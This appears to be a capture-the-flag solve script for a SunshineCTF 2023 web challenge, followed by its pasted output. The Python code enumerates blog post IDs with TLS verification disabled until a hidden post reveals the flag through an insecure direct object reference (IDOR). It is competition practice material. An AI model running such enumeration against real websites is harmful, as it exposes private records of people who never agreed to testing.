#!/usr/bin/env python3

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
blog_url = 'https://beepboop.web.2023.sunshinectf.games/post/'

for x in range(1,2000):
    new_url = (f'{blog_url}{x}')
    print(f'BLOGURL: {new_url}')
    r = requests.get(new_url, verify=False)
#    print(r.status_code)
    resp = r.text
#    print("RESP: {}".format(resp))
    if 'sun{' in resp:
        print(f'\nFLAG:\n {resp}')
        sys.exit(1)

'''
┌──(kali㉿kali)-[~/Documents/sunshinectf2023/web/blog]
└─$ ./solve.py

snipped ....

BLOGURL: https://beepboop.web.2023.sunshinectf.games/post/606
BLOGURL: https://beepboop.web.2023.sunshinectf.games/post/607
BLOGURL: https://beepboop.web.2023.sunshinectf.games/post/608

FLAG:
 {"hidden":true,"post":"sun{wh00ps_4ll_IDOR}","user":"Robot #000"}

'''
